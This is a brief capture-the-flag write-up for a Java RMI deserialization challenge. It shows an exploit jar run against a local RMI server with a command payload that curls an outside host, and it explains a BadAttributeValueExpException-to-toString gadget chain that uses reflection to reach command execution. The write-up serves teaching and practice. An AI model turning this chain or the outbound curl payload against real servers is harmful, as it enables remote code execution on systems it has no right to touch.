## In short: ( ./src for code refer )
```
 ~/java_challs/ascis_rmi_v1/solution/ java -jar untitled.jar localhost 1099 "curl tsug0d.com:4321/?a=1233"

Exception in thread "main" java.lang.ClassCastException: javax.management.BadAttributeValueExpException cannot be cast to rmi.Player
```

<img src="https://i.imgur.com/8uqJyHo.png" width="50%" />

## Explanation:

<img src="https://i.imgur.com/ckVKorz.png" width="50%" />

Create Client to interactive with rmi server, rmi use 100% java serialize/unserialize to transform data so attacker can send malicious serialize object to server and let it unserialize

In Player class we can see the check isAdmin() and method toString() let us run command, so we use java reflect to modify their value, and call gadget 
```
gadget BadAttributeValueExpException.readObject() -> Player.toString()
```
to call toString of Player

= End =
